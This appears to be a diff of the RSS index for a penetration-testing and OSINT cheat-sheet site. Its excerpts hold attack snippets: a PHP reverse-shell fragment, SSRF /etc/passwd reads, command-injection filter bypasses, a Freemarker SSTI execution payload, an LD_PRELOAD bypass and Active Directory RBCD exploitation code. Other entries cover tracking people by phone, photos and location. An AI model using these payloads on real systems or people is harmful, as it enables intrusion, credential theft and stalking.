+Sessions # Query DC to check about domain active sessions: net group “Domain Controllers” /domain (build dcs.txt with it) nslookup –type=SRV _ldap._tcp. net group “Domain Admins” /domain (build admins.txt with it) netsess.exe netsess.exe servername netsess.exe servername /full (admin required) FOR /F %i in (dcs.</description>
     </item>
     
     <item>
@@ -976,32 +1156,13 @@ PHP php -r &amp;#39;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s
     </item>
     
     <item>
-      <title>Buscador</title>
-      <link>/open-source-intelligence-osint/buscador/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/buscador/</guid>
-      <description>Tools Custom Firefox Browser &amp;amp; Add-Ons Custom Chrome Browser &amp;amp; Extensions Tor Browser Custom Video Manipulation Utilities Custom Video Download Utility Amass BleachBit EmailHarvester ExifTool EyeWitness Ghiro GIMP Google Earth Pro HTTrack Cloner InstaLooter KeePassXC Kleopatra Knock Pages LibreOffice LinkedInt Maltego	Metagoofil MediaInfo Metadata Anonymisation Toolkit PhoneInfoga Photon ReconDog Recon-NG SkipTracer SocialMapper Spiderfoot StegoSuite SubBrute Sublist3r theHarvester Tinfoleak Twint Twitter Exporter VeraCrypt VLC Yubico Utilities 
-Tools descriptions # Firefox and some plugins - Download Star - ExifViewer - Firefox multiaccount - HTTPS Everywhere - Image Search Options - MJsonViewer - Nimbus Screen Capture - Resurrect Pages - Take Webpage Screenshots Entirely - uBlock Origin - User-Agent Switcher - Video DownloadHelper # Google Chrome with other plugins # TOR Browser # Custom Video Manipulation Utilities # Custom Video Download Utility # Amass → DNS Enumeration → Network Mapping # BleachBit → Clean your PC # EmailHarvester → Collect emails using search engines # Exiftool → Extract metadata from images # EyeWitness → Take screenshots from website → Get HTTP headers → Identify some credentials → Basic tool semi passive # Ghiro → Ghiro is a fully automated tool designed to run forensics analysis over a massive amount of images → Just using an user friendly and fancy web application.</description>
-    </item>
-    
-    <item>
       <title>CMSMap</title>
-      <link>/web-attacks/content-management-system-cms/cmsmap/</link>
+      <link>/web-pentest/content-management-system-cms/cmsmap/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/content-management-system-cms/cmsmap/</guid>
+      <guid>/web-pentest/content-management-system-cms/cmsmap/</guid>
       <description>Intro # CMSmap is a python open source CMS scanner that automates the process # of detecting security flaws of the most popular CMSs. # The main purpose of CMSmap is to integrate common vulnerabilities for # different types of CMSs in a single tool. # At the moment, CMSs supported by CMSmap are WordPress, Joomla, Drupal and Moodle. 
 Usage usage: cmsmap [-f W/J/D] [-F] [-t] [-a] [-H] [-i] [-o] [-E] [-d] [-u] [-p] [-x] [-k] [-w] [-v] [-h] [-D] [-U W/J/D] [target] CMSmap tool v1.</description>
-    </item>
-    
-    <item>
-      <title>Company General Informations</title>
-      <link>/open-source-intelligence-osint/technical-recon/company_meta/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/technical-recon/company_meta/</guid>
-      <description>Company Informations # Find informations about a company https://opencorporates.com # Find multiples sites owned by the same individual/company http://www.spyonweb.com https://www.crunchbase.com https://fr.kompass.com/ https://www.infogreffe.fr/ # Jobs https://www.glassdoor.fr/index.htm # Find people based on several websites https://recruitin.net/ # Cadastre FR https://cadastre.gouv.fr # Call for tender → BOAMP https://www.boamp.fr/ # Legal and Financial informations (might not be free for full informations) https://www.societe.com/ # Brands https://www.inpi.fr/fr # Look for reported vulnerabilities https://www.openbugbounty.org/ # OSINT on Chinese companies https://www.</description>
     </item>
     
     <item>
@@ -1016,11 +1177,29 @@ Exploiting crontab # If a script is running with higher privileges echo &amp;#34
     
     <item>
       <title>Datasploit</title>
-      <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/datasploit/</link>
+      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/datasploit/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/datasploit/</guid>
+      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/datasploit/</guid>
       <description>General Informations # Performs automated OSINT on a domain / email / username / IP and find out relevant information from different sources. # Easy to contribute OSINT Framework. # Code for Banner, Main and Output function. Datasploit automagically do rest of the things for you. # Useful for Pen-testers, Bug Bounty Hunters, Cyber Investigators, Product companies, Security Engineers, etc. # Collaborate the results, show them in a consolidated manner.</description>
+    </item>
+    
+    <item>
+      <title>HTTP Request Smuggling</title>
+      <link>/web-pentest/resources-discovery/http_request_smuggling/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-pentest/resources-discovery/http_request_smuggling/</guid>
+      <description>HTTP Request Smuggling https://portswigger.net/web-security/request-smuggling # Smuggler.py is a small tool used to test that python smuggler.py -h _ ___ _ __ ___ _ _ __ _ __ _| | ___ _ __ _ __ _ _ / __| &amp;#39;_ ` _ \| | | |/ _` |/ _` | |/ _ \ &amp;#39;__| | &amp;#39;_ \| | | | \__ \ | | | | | |_| | (_| | (_| | | __/ | _ | |_) | |_| | |___/_| |_| |_|\__,_|\__, |\__, |_|\___|_| (_) | .</description>
+    </item>
+    
+    <item>
+      <title>Instagram</title>
+      <link>/open-source-intelligence-osint/platforms-hunting/instagram/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/platforms-hunting/instagram/</guid>
+      <description>Tips &amp;amp; Tricks Instagram ID # Instagram User ID can be very important to investigate # Each account has a unique user ID linked to the @username # Some websites allows to get it for an account https://codeofaninja.com/tools/find-instagram-user-id # You can then trace and spot re-used instagram account by # searching for old names and post, for example using # Google Dorks Mirrors # Instagram Mirrors can be usefull to browse Instagram accounts # Search features are less restrictive # Some deleted content can still be indexed https://rankersta.</description>
     </item>
     
     <item>
@@ -1034,6 +1213,16 @@ General &amp;amp; Theory # Kerberos is just SSO, it&amp;#39;s like SAML or OpenI
     </item>
     
     <item>
+      <title>Others</title>
+      <link>/open-source-intelligence-osint/technical-recon/misc/others/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/misc/others/</guid>
+      <description>Secrets &amp;amp; Default Passwords # Looking for passwors, API keys etc # Check Online IDES site:http://ideone.com &amp;#34;apikey&amp;#34; site:http://ideone.com &amp;#34;aws_access_key_id&amp;#34;# Default passwords https://www.routerpasswords.com/ https://cirt.net/passwords https://default-password.info/ http://defaultpassword.us/ http://www.passwordsdatabase.com/ http://open-sez.me/ Code replication # You can find same website piece of code to identify same vendors https://nerdydata.com/search https://searchcode.com/ 
+Forums # Find informations on forums http://boardreader.com https://raidforums.com/</description>
+    </item>
+    
+    <item>
       <title>Persistence</title>
       <link>/windows-systems/post-exploitation-techniques/persistence/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -1044,59 +1233,43 @@ Userland &amp;amp; Elevated # Userland techniques # HKCU # Create a REG_SZ value
     </item>
     
     <item>
-      <title>PrivExchange</title>
-      <link>/windows-systems/privilege-escalation/privexchange/</link>
+      <title>Picture Investigation</title>
+      <link>/open-source-intelligence-osint/human-recon/pictures/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/windows-systems/privilege-escalation/privexchange/</guid>
-      <description>Resources https://github.com/dirkjanm/PrivExchange https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/ https://chryzsh.github.io/exploiting-privexchange/ # After exploitation, you won&amp;#39;t be like Domain Admin directly, so, you won&amp;#39;t be able to connect to the # DC using Domain Admins rights. # Exploitation allows user to get DCSync privileges, which is enough to get the NTDS Database # You can then use Pass the Hash attack with administrators accounts to get real access 
-Aclpwn # ACLpwn is a tool used to find compromission paths inside BloodHound data and to exploit them # BloodHound need to be running # Many options are available # Dry option is used to look for compromission without exploiting it python aclpwn.</description>
+      <guid>/open-source-intelligence-osint/human-recon/pictures/</guid>
+      <description>General # Flickr Image search https://www.flickr.com/map 
+Reverse Image Search # General Engines https://images.google.com/ https://tineye.com/ https://www.bing.com/?scope=images&amp;amp;nr=1&amp;amp;FORM=NOFORM # Reverse Russia https://www.yandex.com/images/ # Reverse China http://images.baidu.com/ 
+Image Investigation # EXIF and metadata http://exif.regex.info/exif.cgi # Basics Forensics https://fotoforensics.com/ # Text recognition (OCR) https://www.newocr.com/ # Stolen Camera Finder https://www.stolencamerafinder.com/ 
+Deblurring images # Gaussian Blur # Install GIMP Plugin &amp;#34;G&amp;#39;MIC&amp;#34; # Filters&amp;gt;G’MIC&amp;gt;Details&amp;gt;Sharpen (Deblur)# Pixelize # The Pixelize blur works by dividing an image into a number of squares # and then replacing all the pixels in each square by average of their values.</description>
     </item>
     
     <item>
       <title>Server Side Request Forgery (SSRF)</title>
-      <link>/web-attacks/server-side-injections/ssrf/</link>
+      <link>/web-pentest/injections/server-side-injections/ssrf/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/server-side-injections/ssrf/</guid>
+      <guid>/web-pentest/injections/server-side-injections/ssrf/</guid>
       <description>https://vinc.top/2016/11/24/server-side-request-forgery https://github.com/allanlw/svg-cheatsheet 
 PoC and enumeration # It is possible to prove the vulnerability by reading local files # Using the file protocol url=file:///etc/passwd # Then you can enumerate local services that are listening # Depending on the response http://localhost:&amp;lt;port&amp;gt; # It is also possible to use others protocols like gopher and dict # They don&amp;#39;t send HTTP headers and can avoid misinterpretation gopher://127.0.0.1:6379/test # Filter bypass http://127.1 instead of http://127.</description>
     </item>
     
     <item>
-      <title>Skiptracer</title>
-      <link>/open-source-intelligence-osint/human-recon/skiptracer/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/human-recon/skiptracer/</guid>
-      <description>Skiptracer # Tool https://github.com/xillwillx/skiptracer/wiki # It uses some basic python webscraping to compile passive information on a target # Included modules will allow queries for the following : # Phone # Email # Screen names # Real names # Addresses # IP # Hostname # Breach Credentials python skiptracer.py -l phone python skiptracer.py -l email python skiptracer.py -l sn python skiptracer.py -l plate- # Phone Number (FR) https://www.</description>
-    </item>
-    
-    <item>
-      <title>Tinder</title>
-      <link>/open-source-intelligence-osint/human-recon/social-networks/tinder/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/human-recon/social-networks/tinder/</guid>
-      <description># More like Social Engineering # But it&amp;#39;s possible to fake your location # Using the android app → Android Emulator # Using the web app → Fake your brower location # Then you can go on sources (web app) and get pictures to reverse image search # You can also save them using wireshark # https://www.learnallthethings.net/osmosis # You can browe users https://www.</description>
-    </item>
-    
-    <item>
       <title>Tricks &amp; Others</title>
-      <link>/web-attacks/php-vulnerabilities/tricks_others/</link>
+      <link>/web-pentest/php-vulnerabilities/tricks_others/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/php-vulnerabilities/tricks_others/</guid>
+      <guid>/web-pentest/php-vulnerabilities/tricks_others/</guid>
       <description>Code auditing / Looking for vulnerabilities https://github.com/dustyfresh/PHP-vulnerability-audit-cheatsheet 
 Bypass PHP disable_functions and open_basedir # PHP in Linux calls a binary (sendmail) when the mail() function is executed. # If we have putenv() allowed, we can set the environment variable &amp;#34;LD_PRELOAD&amp;#34;, so we can # preload an arbitrary shared object. Our shared object will execute our custom # payload (a binary or a bash script) without the PHP restrictions, so we can have a reverse shell, for example.</description>
     </item>
     
     <item>
       <title>110 - POP3</title>
-      <link>/recon-enumeration/services-enumeration/110_pop3/</link>
+      <link>/network/services-enumeration/110_pop3/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/services-enumeration/110_pop3/</guid>
+      <guid>/network/services-enumeration/110_pop3/</guid>
       <description>Identification and Scans # Retrieve POP3 server capabilities (CAPA, TOP, USER, SASL, RESP-CODES, LOGIN-DELAY, PIPELINING, EXPIRE, UIDL, IMPLEMENTATION) nmap -v -sV --version-intensity=5 --script pop3-capabilities -p T:110 IP # Try to bruteforce POP3 accounts nmap --script pop3-brute --script-args pop3loginmethod=SASL-LOGIN -p T:110 IP nmap --script pop3-brute --script-args pop3loginmethod=SASL-CRAM-MD5 -p T:110 IP nmap --script pop3-brute --script-args pop3loginmethod=APOP -p T:110 IP 
 Banner grabbing/checking # Using netcat nc &amp;lt;IP&amp;gt; 110 # Using telnet telnet &amp;lt;IP&amp;gt; 110</description>
     </item>
@@ -1112,41 +1285,49 @@ Banner grabbing/checking # Using netcat nc &amp;lt;IP&amp;gt; 110 # Using telnet
     
     <item>
       <title>Danger Zone</title>
-      <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/danger_zone/</link>
+      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/danger_zone/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/danger_zone/</guid>
+      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/danger_zone/</guid>
       <description>General Informations https://github.com/woj-ciech/Danger-zone ⇒ HORRIBLE SETUP #FuckingGoogleSearchApiModule # Correlate data between domains, ips and email addresses, present it as a graph # And store everything into Elasticsearch and JSON files # You have to edit the settings.json file in order to provide your API keys and Elestic database info # Golden Rule → Don&amp;#39;t jump to conclusions too fast 
 Usage python danger-zone.py -h usage: dangerzone.py [-h] [--email EMAIL] [--address ADDRESS] [--domain DOMAIN] [--elasticsearch] Correlate data between domains, ips and email addresses and present it as a graph.</description>
     </item>
     
     <item>
-      <title>Geolocation</title>
-      <link>/open-source-intelligence-osint/human-recon/geolocation/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/human-recon/geolocation/</guid>
-      <description># Snapchat Live Map can be good and funny source https://map.snapchat.com # Learn to use Overpass API https://osmlab.github.io/learnoverpass//en/ 
-Creepy # Creepy is a tool that performs geolocalization through social network inputs # Written in Python, you get a GUI # It uses modules for social networks # You need to first configurate your plugins (using API key for example) # Then you can start a new person project # You choose your plugins, let the soft searches and then add targets to the global search # Once done, you can start searching (often several minutes) # Then you will get locations on the world map for data found # Possible to export results https://www.</description>
-    </item>
-    
-    <item>
       <title>Headers Injections</title>
-      <link>/web-attacks/headers_injections/</link>
+      <link>/web-pentest/injections/headers_injections/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/headers_injections/</guid>
+      <guid>/web-pentest/injections/headers_injections/</guid>
       <description>Security Headers HTTP Strict Transport Security (HSTS) --- Force HTTPS if enabled on the website Content Security Policy (CSP) --- Restrict/Whitelist some resources for some users X-XSS-Protection --- Protection for XSS X-Frame-Options --- Protect from clickjacking by removing iframes X-Content-Type-Options --- Protect from MIME sniffing # Cookie Set-Cookie Secure --- Prevent cookie stealing during transport Set-Cookie HttpOnly --- Prevent cookie stealing in the web browser Set-Cookie SameSite --- Prevent from CSRF (cookies will stay on the website)</description>
     </item>
     
     <item>
       <title>MISC &amp; Others</title>
-      <link>/web-attacks/content-management-system-cms/others/</link>
+      <link>/web-pentest/content-management-system-cms/others/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/content-management-system-cms/others/</guid>
+      <guid>/web-pentest/content-management-system-cms/others/</guid>
       <description>CMSimple # CMSimple LFI index.php ?sl=../adm&amp;amp;file=config&amp;amp;action=download&amp;amp;adm=1 
 NanoCMS # Password and sensitive data leak [url]/data/pagesdata.</description>
+    </item>
+    
+    <item>
+      <title>OS Command Injections</title>
+      <link>/web-pentest/injections/server-side-injections/os/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-pentest/injections/server-side-injections/os/</guid>
+      <description>Command Injection # Command Injection blablabla ; ls # Bypass filters - syntax error &amp;#39;&amp;#39; OK &amp;#39;127.0.0.1&amp;#39; OK () syntax error `ls` syntax error (car ` filtré donc `ls` =&amp;gt; ls) `;` OK 127.|0.0.1 OK =&amp;gt; | filtré 127.0.&amp;amp;0.1 OK =&amp;gt; &amp;amp; filtré 127.0.;0.1 OK =&amp;gt; ; filtré 127.0.$0.1 OK =&amp;gt; $ filtré 127.0.`0.1 OK =&amp;gt; ` filtré 127.0.``0.1 OK =&amp;gt; ` filtré 127.0.&amp;#39;0.1 syntax error =&amp;gt; &amp;#39; pas filtré 127.</description>
+    </item>
+    
+    <item>
+      <title>Phone</title>
+      <link>/open-source-intelligence-osint/human-recon/phone/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/human-recon/phone/</guid>
+      <description>Getting informations using a phone number # When you have a phone number, you can use some messaging websites/applications # If the target is registered, it can provides additional informations # /!\ Some applications might tell the target you&amp;#39;ve reached them /!\ https://medium.com/@Ginger_T/how-can-we-use-messenger-apps-in-osint-682cbc634f Facebook Messenger # Profile picture and details from Facebook bio Facetime # If you add a contact on Apple it wil tell you if the target can use Facetime # If so, you know the target is using an Apple Product ICQ # Profile Picture, Nickname, Name, BIO &amp;amp; last seen.</description>
     </item>
     
     <item>
@@ -1161,10 +1342,10 @@ cmd.exe # Enable RDP from cmd.exe reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\Cur
     
     <item>
       <title>Snapchat</title>
-      <link>/open-source-intelligence-osint/human-recon/social-networks/snapchat/</link>
+      <link>/open-source-intelligence-osint/platforms-hunting/snapchat/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/human-recon/social-networks/snapchat/</guid>
+      <guid>/open-source-intelligence-osint/platforms-hunting/snapchat/</guid>
       <description>Online Research Tools # Online browser # Potentially NSFW https://sovip.io # User Search https://www.snapdex.com/ https://snapyfox.com/ # Location https://map.snapchat.com/ Snapchat Map https://osintcurio.us/2020/04/13/using-snapchat-for-osint-10-minute-tip/ # Using the map you can view public content # You can play with overlays and save videos # To get video # - Developper Tools (F12) # - Network and filter on medias # - Reload (Ctrl+R) # - On the snap link, right click and open in new tab # By default it removes extra graphics layer https://s.</description>
     </item>
     
@@ -1179,12 +1360,21 @@ cmd.exe # Enable RDP from cmd.exe reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\Cur
     
     <item>
       <title>119 - NTP</title>
-      <link>/recon-enumeration/services-enumeration/119_nntp/</link>
+      <link>/network/services-enumeration/119_nntp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/services-enumeration/119_nntp/</guid>
+      <guid>/network/services-enumeration/119_nntp/</guid>
       <description> Banner Grabbing # Using telnet telnet IP 119 # Using netcat nc -nv IP 119 LIST 
 Identification and manual test # Using netcat nc -nv IP 119 LIST GROUP group_name to display related messages POST From; test@knacki.fr Newsgroups: group_name Subject: Test This is a test. . HEAD identity_article ARTICLE identity_article BODY identity_article</description>
+    </item>
+    
+    <item>
+      <title>Active Directory Delegations</title>
+      <link>/windows-systems/privilege-escalation/delegations/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/delegations/</guid>
+      <description>RBCD Exploitation https://github.com/aas-n/leHACK19 # Importing Powerview and Powermad Import-Module .\Powerview.ps1 Import-Module .\Powermad.ps1 # Authentication $TargetComputer = &amp;#34;DC01.domain.lan&amp;#34; $SecPassword = ConvertTo-SecureString &amp;#39;passw0rd&amp;#39; -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential(&amp;#39;DOMAIN\ControlledAccount&amp;#39;, $SecPassword) # Get our user&amp;#39;s SID $AttackerSID = Get-DomainUser ControlledUser -Credential $Cred -Server 10.10.10.10 -Properties objectsid | Select -Expand objectsid $ACE = Get-DomainObjectACL $TargetComputer -Credential $Cred -Server 10.10.10.10 | ?{$_.SecurityIdentifier -match $AttackerSID} # Adding a machine and getting SID New-MachineAccount -Credential $Cred -Domain domain.</description>
     </item>
     
     <item>
@@ -1198,81 +1388,74 @@ SMB Server setup # Set up a SMB server using smbserver.py from impacket smbserve
     </item>
     
     <item>
-      <title>Geolocation</title>
-      <link>/open-source-intelligence-osint/human-recon/phone_number/</link>
+      <title>Geolocation &amp; GEOINT</title>
+      <link>/open-source-intelligence-osint/human-recon/geolocation/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/human-recon/phone_number/</guid>
-      <description>Getting informations using a phone number # When you have a phone number, you can use some messaging websites/applications # If the target is registered, it can provides additional informations # /!\ Some applications might tell the target you&amp;#39;ve reached them /!\ https://medium.com/@Ginger_T/how-can-we-use-messenger-apps-in-osint-682cbc634f# Facebook Messenger # Profile picture and details from Facebook bio # Facetime # If you add a contact on Apple it wil tell you if the target can use Facetime # If so, you know the target is using an Apple Product # ICQ # Profile Picture, Nickname, Name, BIO &amp;amp; last seen.</description>
-    </item>
-    
-    <item>
-      <title>MISC &amp; Others</title>
-      <link>/web-attacks/misc_others/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/web-attacks/misc_others/</guid>
-      <description>Table of Content  MISC IDOR Hidden Parameters Apache Server Status Command Injection Server Side Template Injection (SSTI) Image Tragick Shellshock Heartbleed  
-MISC # Security Headers https://securityheaders.com # /!\ HTTP POST Requests needs two carriage return at the end to be valid ! # Install files # You can check for backup files using the following extensions .backup, .bck, .old, .save, .bak, .sav, ~, .copy, .old, .orig, .</description>
-    </item>
-    
-    <item>
-      <title>Photon</title>
-      <link>/open-source-intelligence-osint/technical-recon/photon/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/technical-recon/photon/</guid>
-      <description>General Informations # Photon is a fast OSINT web crawler which can retrieve the following data for a target : # URLs (in-scope &amp;amp; out-of-scope) # URLs with parameters (example.com/gallery.php?id=2) # Intel (emails, social media accounts, amazon buckets etc.) # Files (pdf, png, xml etc.) # Secret keys (auth/API keys &amp;amp; hashes) # JavaScript files &amp;amp; Endpoints present in them # Strings matching custom regex pattern # Subdomains &amp;amp; DNS related data # You can use the --ninja 4 option to get 4 clients requesting server.</description>
+      <guid>/open-source-intelligence-osint/human-recon/geolocation/</guid>
+      <description># Snapchat Live Map can be good and funny source https://map.snapchat.com # Learn to use Overpass API https://osmlab.github.io/learnoverpass//en/ 
+Realtime Movement (MISC) # Flight Radar in realtime https://www.flightradar24.com # Marine Trafic in realtime https://www.marinetraffic.com/ # Instant StreetView https://www.instantstreetview.com/ # Car embedded cameras tracks https://openstreetcam.org 
+Photo identification # Find photos taken by the same camera using serial number # We don&amp;#39;t know how files are processed/stored.. https://www.stolencamerafinder.com/ 
+Tips &amp;amp; Trick for GeoINT # GREAT resource about tips from Geoguessr https://somerandomstuff1.</description>
     </item>
     
     <item>
       <title>ReconDog</title>
-      <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/recondog/</link>
+      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/recondog/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/recondog/</guid>
+      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/recondog/</guid>
       <description>General Informations # Recon Dog is an all in one tool for all your basic information gathering needs. # It uses APIs to gather all the information so your identity is not exposed. # Simple and basic standalone python script # All informations seems to be extracted from API&amp;#39;s services, so it fully passive 
 Modules &amp;amp; Tools • Censys: uses censys.io to collect a large amount of information about an IP address • NS Lookup: Performs name server search • Port scan: Scans the most common TCP ports • Detect CMS: Can detect more than 400 content management systems • Whois Lookup: Performs whois protocol search • Detect honeypot: Uses Shodan to identify whether the target is a honeypot • Find subdomains: Search for sub-domains using com • Reverse IP Lookup: Does an inverse IP lookup to find domains associated with an IP address • Detect technologies: Uses wappalyzer.</description>
     </item>
     
     <item>
-      <title>Usernames and Emails</title>
-      <link>/open-source-intelligence-osint/human-recon/social-networks/usernames_mails/</link>
+      <title>SSTI</title>
+      <link>/web-pentest/injections/server-side-injections/ssti/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/human-recon/social-networks/usernames_mails/</guid>
-      <description># Username availability https://namechk.com/ 
-Socialscan (https://github.com/iojw/socialscan) # Many tools used to check if an account exists comes with false positive # 100% accuracy: Rather than scanning profile pages, socialscan queries the # registration servers of the platforms directly, retrieving the appropriate # CSRF tokens, headers, and cookies. # This eliminates all false positives/negatives, ensuring that results are accurate. # Speed: socialscan uses asyncio along with aiohttp to conduct all # queries concurrently, resulting in very quick searching even with bulk queries.</description>
+      <guid>/web-pentest/injections/server-side-injections/ssti/</guid>
+      <description>Server Side Template Injection # You can use tools like tplmap ./tplmap.py -u http://challenge01.root-me.org/web-serveur/ch41/check -d &amp;#34;nickname=john&amp;#34; ./tplmap.py -u http://challenge01.root-me.org/web-serveur/ch41/check -d &amp;#34;nickname=john&amp;#34; --os-shell # Freemarker command execution &amp;lt;#assign ex=&amp;#34;freemarker.template.utility.Execute&amp;#34;?new()&amp;gt; ${ ex(&amp;#34;cmd&amp;#34;) }</description>
+    </item>
+    
+    <item>
+      <title>TikTok</title>
+      <link>/open-source-intelligence-osint/platforms-hunting/tiktok/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/platforms-hunting/tiktok/</guid>
+      <description>TikTok # Resources https://www.skopenow.com/news/tiktok-investigations-and-osint-tips # Searching info https://www.osintcombine.com/tiktok-quick-search # Downloader https://ttdown.org/ https://en.savefrom.net/download-from-tiktok # Tiktok Analytics https://cloutmeter.com/ Profile Discovery # Method 1 : You have usernames tiktok.com/@{username} # Method 2 : Involving Dorks site:tiktok.com &amp;#34;username&amp;#34; OR &amp;#34;first and last name&amp;#34; # Method 3 : Search for mentions on other social media &amp;#34;username&amp;#34; OR &amp;#34;first and last name&amp;#34; &amp;#34;tiktok.com&amp;#34; -site:tiktok.com Profile Picture # Method 1 # Right click --&amp;gt; Inspect # Method 2 https://tiktok.</description>
     </item>
     
     <item>
       <title>135 - RPC</title>
-      <link>/recon-enumeration/services-enumeration/135_rpc/</link>
+      <link>/network/services-enumeration/135_rpc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/services-enumeration/135_rpc/</guid>
+      <guid>/network/services-enumeration/135_rpc/</guid>
       <description>Resources http://attackerkb.com/Windows/rpcclient rpcclient # Anonymous connection (-N=no pass) rpcclient -U “” -N &amp;lt;ip&amp;gt; # Connection with user rpcclient -U “user” &amp;lt;ip&amp;gt; # Get information about the DC srvinfo # Get information about objects such as groups (enum*) enumdomains enumdomgroups enumalsgroups builtin # Try to get domain password policy getdompwinfo # Try to enumerate different truste domains dsr_enumtrustdom # Get username for a defined user ? getusername # Query user, group etc informations queryuser RID querygroupmem519 queryaliasmem builtin 0x220 # Query info policy lsaquery # Convert SID to names lookupsids SID</description>
     </item>
     
     <item>
-      <title>BurpSuite</title>
-      <link>/web-attacks/burpsuite/</link>
+      <title>Attacking APIs</title>
+      <link>/web-pentest/attacking_apis/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/burpsuite/</guid>
-      <description>WORK IN PROGRESS 
-Notes / Tips # /!\ HTTP POST Requests needs two carriage return at the end to be valid ! # Firefox sends an HTTP GET every 60s to hxxp://detectportal.firefox.com. To avoid : about:config &amp;gt; network.captive-portal-service.enabled ==&amp;gt; false 
-Modules / Addons # Autorize # For Each Request you do, it will send an equal request # But with changed cookies of the session or any additional header used for authorization.</description>
+      <guid>/web-pentest/attacking_apis/</guid>
+      <description>Resources https://medium.com/datadriveninvestor/api-security-testing-part-1-b0fc38228b93 https://medium.com/bugbountywriteup/31-tips-api-security-pentesting-480b5998b765 https://github.com/smodnix/31-days-of-API-Security-Tips https://docs.google.com/spreadsheets/d/1jn3JnWzQFZW41gKo5Fhxwf2ke2w-pvrpCGhBmKhyIBE/edit#gid=0 https://medium.com/@inonst/a-deep-dive-on-the-most-critical-api-vulnerability-bola-1342224ec3f2 
+SOAP vs REST # REST uses: HTTP, JSON , URL and XML # SOAP uses: mostly HTTP and XML # SOAP can be more recommandded in terms of security, if you have to process critical data. 
+Checklist # Test tokens # Authentication token, JWT, Base64 encoded... # Input validation # All entry points (command injection, sql injections, html...) # Cookies, Headers ?</description>
     </item>
     
     <item>
-      <title>General - MISC - Multi</title>
-      <link>/open-source-intelligence-osint/human-recon/social-networks/general_misc/</link>
+      <title>BurpSuite</title>
+      <link>/web-pentest/tools/burpsuite/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/human-recon/social-networks/general_misc/</guid>
-      <description>Tips &amp;amp; Tricks # Liveleak allows to see what will be removed on others video website.. # Take care https://www.liveleak.com/ # Webcams (legit and bad configuration) http://www.insecam.org/ https://www.earthcam.com # Download Periscope videos https://downloadperiscopevideos.com/index.php # Professionnal profiles (like photos) can be used to search for differents # personal profiles which are easier to exploit and dig 
